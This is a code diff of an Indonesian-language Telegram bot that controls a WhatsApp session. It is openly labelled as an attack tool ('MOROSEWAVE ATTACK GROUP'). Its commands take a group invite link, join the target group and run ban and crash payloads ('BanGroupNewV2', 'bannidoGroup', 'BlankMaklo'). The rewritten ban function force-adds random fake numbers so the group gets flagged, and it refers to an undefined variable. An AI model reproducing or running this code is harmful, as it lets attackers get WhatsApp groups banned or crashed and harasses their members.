@@ -2648,7 +2648,6 @@ bot.action('menu_bug3', async (ctx) => {
  
 [ GROUP BUG ]
   /morogroupv1 - Ban Group
-  /morogroupv2 - Blank Group
   
 [ PAGE 4/6 ]
 </code></pre>`;
@@ -3236,43 +3235,108 @@ Status: Success
 //CASE BUG GROUP
 bot.command("morogroupv1", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
     let input = ctx.message.text.split(" ").slice(1).join(" ");
-    if (!input) return ctx.reply("☇ Format: /morogroup https://chat.whatsapp.com/xxxxx");
+    if (!input) return ctx.reply("☇ Format: /morogroupv1 https://chat.whatsapp.com/xxxxx");
     
     let inviteCode = input;
     const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
     if (match) inviteCode = match[1];
 
-    await ctx.reply(`✅ Sedang memproses group...`);
+    await sendBugNotification(ctx, '/morogroupv1', input);
+
+    const msg = await ctx.reply(`<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Target   : ${input}
+♛ Status   : Processing
+♛ Loop     : 10
+♛ Delay    : 2000ms
+</code></pre>`, {
+        parse_mode: "HTML",
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "CEK GROUP", url: `${input}`, style: "danger" }
+                ]
+            ]
+        }
+    });
 
     try {
         const groupInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
         if (!groupInfo) {
-            return ctx.reply(`❌ Invite link tidak valid atau expired!`);
+            return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Target   : ${input}
+♛ Status   : Failed
+♛ Reason   : Link invalid/expired
+</code></pre>`, {
+                parse_mode: "HTML"
+            });
         }
 
         const groupJid = groupInfo.id;
+        const groupName = groupInfo.subject || 'Unknown';
 
         const isBotInGroup = groupInfo.participants?.some(p => p.id === sock.user.id);
         if (!isBotInGroup) {
             await sock.groupAcceptInvite(inviteCode).catch(() => null);
-            await ctx.reply(`✅ Berhasil join group: ${groupInfo.subject}`);
-        } else {
-            await ctx.reply(`ℹ️ Bot sudah join di group: ${groupInfo.subject}`);
         }
 
+        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Group    : ${groupName}
+♛ Target   : ${input}
+♛ Status   : SUCCESS
+♛ Delay    : 2000ms
+</code></pre>`, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "CEK GROUP", url: `${input}`, style: "danger" }
+                    ]
+                ]
+            }
+        });
+
+        let success = 0;
         for (let i = 0; i < 1; i++) {
             try {
-                await BanGroupNew(sock, groupJid);
+                await BanGroupNewV2(sock, groupJid);
+                success++;
+                console.log(`✅ [${i+1}/3] BanGroup executed`);
             } catch (err) {
-                console.log(`❌ Gagal kirim H4ters: ${err.message}`);
+                console.log(`❌ [${i+1}/3] Failed: ${err.message}`);
             }
+            await sleep(2000);
         }
 
-        await ctx.reply(`✅ Sukses mengirim Bug ke group: ${groupInfo.subject}`);
+        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Group    : ${groupName}
+♛ Target   : ${input}
+♛ Status   : Success
+♛ Success  : ${success}
+</code></pre>`, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "CEK GROUP", url: `${input}`, style: "success" }
+                    ]
+                ]
+            }
+        });
 
     } catch (error) {
-        console.error('[XGROUP] Error:', error);
-        await ctx.reply(`❌ Gagal: ${error.message}`);
+        console.error('[BANGROUP] Error:', error);
+        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Target   : ${input}
+♛ Status   : Failed
+♛ Reason   : ${error.message}
+</code></pre>`, {
+            parse_mode: "HTML"
+        });
     }
 });
 
@@ -3284,40 +3348,104 @@ bot.command("morogroupv2", checkWhatsAppConnection, checkCooldown, checkCommandE
     const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
     if (match) inviteCode = match[1];
 
-    await ctx.reply(`✅ Sedang memproses group...`);
+    await sendBugNotification(ctx, '/morogroupv2', input);
+
+    const msg = await ctx.reply(`<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Target   : ${input}
+♛ Status   : Processing
+♛ Loop     : 10
+♛ Delay    : 2000ms
+</code></pre>`, {
+        parse_mode: "HTML",
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "CEK GROUP", url: `${input}`, style: "danger" }
+                ]
+            ]
+        }
+    });
 
     try {
         const groupInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
         if (!groupInfo) {
-            return ctx.reply(`❌ Invite link tidak valid atau expired!`);
+            return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Target   : ${input}
+♛ Status   : Failed
+♛ Reason   : Link invalid/expired
+</code></pre>`, {
+                parse_mode: "HTML"
+            });
         }
 
         const groupJid = groupInfo.id;
+        const groupName = groupInfo.subject || 'Unknown';
 
         const isBotInGroup = groupInfo.participants?.some(p => p.id === sock.user.id);
         if (!isBotInGroup) {
             await sock.groupAcceptInvite(inviteCode).catch(() => null);
-            await ctx.reply(`✅ Berhasil join group: ${groupInfo.subject}`);
-        } else {
-            await ctx.reply(`ℹ️ Bot sudah join di group: ${groupInfo.subject}`);
         }
 
-        for (let i = 0; i < 15; i++) {
-            try {
-                await BlankMaklo(sock, groupJid);
-            } catch (err) {
-                console.log(`❌ Gagal kirim H4ters: ${err.message}`);
+        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Group    : ${groupName}
+♛ Target   : ${input}
+♛ Status   : SUCCESS
+♛ Delay    : 2000ms
+</code></pre>`, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "CEK GROUP", url: `${input}`, style: "danger" }
+                    ]
+                ]
             }
+        });
+
+        let success = 0;
+        for (let i = 0; i < 1; i++) {
+            try {
+                await BanGroupNewV2(sock, groupJid);
+                success++;
+                console.log(`✅ [${i+1}/3] BanGroup executed`);
+            } catch (err) {
+                console.log(`❌ [${i+1}/3] Failed: ${err.message}`);
+            }
+            await sleep(2000);
         }
 
-        await ctx.reply(`✅ Sukses mengirim Bug ke group: ${groupInfo.subject}`);
+        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Group    : ${groupName}
+♛ Target   : ${input}
+♛ Status   : Success
+♛ Success  : ${success}
+</code></pre>`, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "CEK GROUP", url: `${input}`, style: "success" }
+                    ]
+                ]
+            }
+        });
 
     } catch (error) {
-        console.error('[XGROUP] Error:', error);
-        await ctx.reply(`❌ Gagal: ${error.message}`);
+        console.error('[BUGGROUP] Error:', error);
+        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
+✘ MOROSEWAVE ATTACK GROUP ✘
+♛ Target   : ${input}
+♛ Status   : Failed
+♛ Reason   : ${error.message}
+</code></pre>`, {
+            parse_mode: "HTML"
+        });
     }
 });
-
 //END CASE BUG
 
 bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
@@ -5653,25 +5781,57 @@ async function Slayerspmvideo(sock, target) {
     }
 }
 //ban gb
-async function BanGroupNew(sock, groupJid) {
-  if (!groupJid.endsWith('@g.us')) {
-    throw new Error('@g.us server required');
-  }
+async function bannidoGroup(sock, groupJid) {
+    if (!groupJid.endsWith("@g.us")) {
+        throw new Error("@g.us server required");
+    }
+    const LIDNUMBER = [
+        "6280000000000@s.whatsapp.net",
+        "14155552671@s.whatsapp.net",
+        "447400000000@s.whatsapp.net",
+        "61400000000@s.whatsapp.net",
+        "6281234567890@s.whatsapp.net",
+        "6287873499996@s.whatsapp.net",
+        "6285655555555@s.whatsapp.net",
+        "6289876543210@s.whatsapp.net",
+        "6281111111111@s.whatsapp.net",
+        "6282222222222@s.whatsapp.net",
+        "6283333333333@s.whatsapp.net",
+        "6284444444444@s.whatsapp.net",
+        "6285555555555@s.whatsapp.net",
+        "6286666666666@s.whatsapp.net",
+        "6287777777777@s.whatsapp.net",
+        "6288888888888@s.whatsapp.net",
+        "6289999999999@s.whatsapp.net",
+        "6281000000001@s.whatsapp.net",
+        "6281000000002@s.whatsapp.net",
+        "6281000000003@s.whatsapp.net",
+        "6281000000004@s.whatsapp.net",
+        "6281000000005@s.whatsapp.net",
+        "6282000000001@s.whatsapp.net",
+        "6282000000002@s.whatsapp.net",
+        "6282000000003@s.whatsapp.net",
+        "6282000000004@s.whatsapp.net",
+        "6282000000005@s.whatsapp.net",
+        "6283000000001@s.whatsapp.net",
+        "6283000000002@s.whatsapp.net",
+        "6283000000003@s.whatsapp.net",
+        "6283000000004@s.whatsapp.net",
+        "6283000000005@s.whatsapp.net"
+    ];
 
-  let group = groupJid;
+    const actions = ["add"];
+    const fake = LIDNUMBER[Math.floor(Math.random() * LIDNUMBER.length)];
+    const action = actions[Math.floor(Math.random() * actions.length)];
 
-  try {
-    await sock.groupParticipantsUpdate(
-      group,
-      ['18188880008@s.whatsapp.net'],
-      'add',
-    );
-
-    await sock.sendPresenceUpdate('composing', group);
-  } catch (err) {
-    console.error('error:', err);
-    throw err;
-  }
+    try {
+        await sock.groupParticipantsUpdate(target, [fake], action);
+        await new Promise(r => setTimeout(r, 2500));
+        return true;
+    } catch (e) {
+        await new Promise(r => setTimeout(r, 1500));
+        return false;
+    }
 }
 //Fc group
 async function BlankMaklo(sock, groupJid) {
